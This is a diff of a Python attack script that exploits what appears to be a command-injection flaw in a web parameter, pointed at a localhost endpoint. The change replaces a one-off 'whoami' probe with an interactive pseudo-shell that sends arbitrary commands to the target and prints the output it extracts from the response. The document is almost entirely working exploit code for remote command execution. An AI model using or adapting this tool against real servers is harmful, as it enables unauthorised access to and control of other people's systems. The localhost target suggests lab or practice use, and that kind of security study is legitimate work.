@@ -9,11 +9,12 @@ import urllib.parse
 address = 'http://localhost:8000/good'
 parameter = 'q'
 url_encode = True
-verbose = True
+verbose = False
+
 
 def voutput(message):
     if verbose:
-        print(f'   ? {message}')
+        print(f'[i] {message}')
 
 def random_string(length=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
@@ -61,20 +62,32 @@ def send_command(command):
         return None
     
     unescaped_response = unescape(response.text)
-    print(f"Raw response: {unescaped_response}")
-    
     return extract_markers(unescaped_response, start_marker, end_marker)
 
 
 
 def main():
+    
     is_successful, error_message = preflight_request()
     if is_successful:
         print("Connection successful!")
     else:
         print(f"Connection failed: {error_message}")
         return
+    
+    host_name = urllib.parse.urlparse(address).netloc
 
-    print(f"Command output: {send_command('whoami')}")
+    # Shell-like environment
+    while True:
+        command = input(f"\n{host_name} > ")
+        if command.lower() in ['exit', 'quit']:
+            print("Exiting shell.")
+            break
+        
+        output = send_command(command)
+        if output is not None:
+            print(f"{output}")
+        else:
+            print("[!] Failed to retrieve command output.")
 
 main()
